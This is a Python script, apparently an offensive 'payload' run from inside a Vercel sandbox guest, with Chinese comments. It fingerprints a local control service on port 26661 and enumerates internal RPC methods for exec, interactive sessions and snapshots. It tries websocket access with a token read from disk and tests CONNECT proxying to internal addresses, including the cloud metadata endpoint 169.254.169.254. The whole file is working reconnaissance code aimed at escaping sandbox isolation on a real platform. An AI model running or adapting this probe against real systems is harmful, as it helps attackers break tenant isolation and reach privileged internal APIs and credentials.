# -*- coding: utf-8 -*-
"""v220 payload (guest): 26661 协议指纹 — banner/HTTP/ConnectRPC/gRPC/ws升级/CONNECT
流程: 等 26661 开放 -> 依次探测 -> 记录响应
输出 /vercel/sandbox/v220c.out"""
import socket, time, signal

OUT = '/vercel/sandbox/v220c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(200)


def log(s, maxlen=4000):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC]'
    try:
        f.write('[%.1f] %s\n' % (time.time(), s))
        f.flush()
    except Exception:
        pass
    print(str(s)[:300], flush=True)


def conn():
    for family, addr in [(socket.AF_INET6, ('::1', 26661)), (socket.AF_INET, ('127.0.0.1', 26661))]:
        try:
            s = socket.socket(family, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect(addr)
            return s
        except Exception:
            try:
                s.close()
            except Exception:
                pass
    return None


def recv_all(s, timeout=1.2):
    s.settimeout(timeout)
    buf = b''
    try:
        while True:
            d = s.recv(4096)
            if not d:
                break
            buf += d
            if len(buf) > 65536:
                break
    except socket.timeout:
        pass
    except Exception as e:
        buf += ('<<ERR:%s>>' % e).encode()
    return buf


def probe(label, send):
    s = conn()
    if not s:
        log('%-28s CONN_FAIL' % label)
        return
    try:
        if send:
            s.sendall(send)
        buf = recv_all(s)
        log('%-28s %d bytes: %r' % (label, len(buf), buf[:1500]))
    except Exception as e:
        log('%-28s EXC %s' % (label, e))
    finally:
        try:
            s.close()
        except Exception:
            pass


def main():
    log('V220_START')
    t0 = time.time()
    while time.time() - t0 < 100:
        s = conn()
        if s:
            s.close()
            log('26661 OPEN after %.0fs' % (time.time() - t0))
            break
        time.sleep(0.4)
    else:
        log('26661 NEVER OPEN')
        return

    # 1) 裸 banner / 基础
    probe('RAW_empty', b'')
    probe('RAW_lf', b'\n')
    probe('RAW_http10', b'GET / HTTP/1.0\r\n\r\n')

    # 2) HTTP 路径枚举
    for p in ['/', '/healthz', '/health', '/version', '/status', '/metrics', '/debug/pprof/']:
        probe('GET ' + p, ('GET %s HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n' % p).encode())

    # 3) ConnectRPC 方法枚举
    methods = [
        '/vercel.sandbox.api.controller.v1.ControllerService/CreateSnapshot',
        '/vercel.sandbox.api.controller.v1.ControllerService/DeleteSnapshot',
        '/vercel.sandbox.api.controller.v1.ControllerService/ListSnapshots',
        '/vercel.sandbox.api.controller.v1.ControllerService/ResumeSandbox',
        '/vercel.sandbox.api.controller.v1.ControllerService/Exec',
        '/vercel.sandbox.api.controller.v1.ControllerService/Interactive',
        '/grpc.health.v1.Health/Check',
        '/vercel.sandbox.api.v1.SandboxService/Exec',
        '/vercel.sandbox.api.v1.SandboxService/Interactive',
        '/vercel.sandbox.api.v1.SandboxService/Spawn',
    ]
    for m in methods:
        body = b'{}'
        req = (b'POST ' + m.encode() + b' HTTP/1.1\r\nHost: 127.0.0.1\r\n'
               b'Content-Type: application/json\r\nConnect-Protocol-Version: 1\r\n'
               b'Content-Length: ' + str(len(body)).encode() + b'\r\nConnection: close\r\n\r\n') + body
        probe('POST ' + m.split('/')[-1], req)

    # 4) ws 升级 (无 token / 带驱动下发的真实 token)
    tok = ''
    try:
        tok = open('/vercel/sandbox/v220_tok').read().strip()
    except Exception:
        pass
    for tk in ['', '?token=' + tok]:
        req = ('GET /ws/interactive%s HTTP/1.1\r\nHost: 127.0.0.1\r\n'
               'Upgrade: websocket\r\nConnection: Upgrade\r\n'
               'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n' % tk).encode()
        probe('WS_UPGRADE%s' % ('_token' if tk else '_notok'), req)

    # 5) CONNECT 代理探测
    for dst in ['100.64.0.1:23456', '127.0.0.1:23456', '169.254.169.254:80']:
        req = ('CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n' % (dst, dst)).encode()
        probe('CONNECT ' + dst, req)

    log('V220_DONE')
    time.sleep(15)
    s = conn()
    log('26661 still open: %s' % bool(s))
    if s:
        s.close()


if __name__ == '__main__':
    main()
